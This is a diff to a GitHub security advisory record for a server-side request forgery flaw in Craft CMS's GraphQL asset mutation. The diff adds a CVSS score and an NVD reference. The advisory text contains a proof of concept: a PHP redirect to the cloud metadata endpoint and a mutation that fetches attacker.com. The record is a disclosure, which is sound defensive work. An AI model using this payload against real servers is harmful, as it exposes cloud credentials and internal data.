@@ -1,14 +1,19 @@
 {
   "schema_version": "1.4.0",
   "id": "GHSA-8jr8-7hr4-vhfx",
-  "modified": "2026-02-09T20:35:30Z",
+  "modified": "2026-02-09T22:38:33Z",
   "published": "2026-02-09T20:35:30Z",
   "aliases": [
     "CVE-2026-25493"
   ],
   "summary": "Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via HTTP Redirect",
   "details": "## Summary\nThe `saveAsset` GraphQL mutation validates the initial URL hostname and resolved IP against a blocklist, but Guzzle follows HTTP redirects by default. An attacker can bypass all SSRF protections by hosting a redirect that points to cloud metadata endpoints or any internal IP addresses.\n\n---\n## Proof of Concept\n1. Host a redirect script on your server (e.g. `redirect.php`):\n```php\n<?php header(\"Location: http://169.254.169.254/latest/meta-data/\"); ?>\n```\n2. Send the following GraphQL mutation:\n```graphql\nmutation {\n    save_images_Asset(_file: { \n        url: \"https://attacker.com/redirect.php\"\n        filename: \"metadata.txt\"\n    }) {\n        id\n    }\n}\n```\n3. The application validates `attacker.com` (passes)\n4. Guzzle follows the redirect to `169.254.169.254`\n5. Cloud metadata is saved as an asset\n\n---\n## Mitigation\n- Disable redirects.",
-  "severity": [],
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+    }
+  ],
   "affected": [
     {
       "package": {
@@ -61,6 +66,10 @@
       "url": "https://github.com/craftcms/cms/security/advisories/GHSA-8jr8-7hr4-vhfx"
     },
     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25493"
+    },
+    {
       "type": "WEB",
       "url": "https://github.com/craftcms/cms/commit/0974055634af68998f67850ab2045d8aaa19fa98"
     },
@@ -84,6 +93,6 @@
     "severity": "MODERATE",
     "github_reviewed": true,
     "github_reviewed_at": "2026-02-09T20:35:30Z",
-    "nvd_published_at": null
+    "nvd_published_at": "2026-02-09T20:15:57Z"
   }
 }
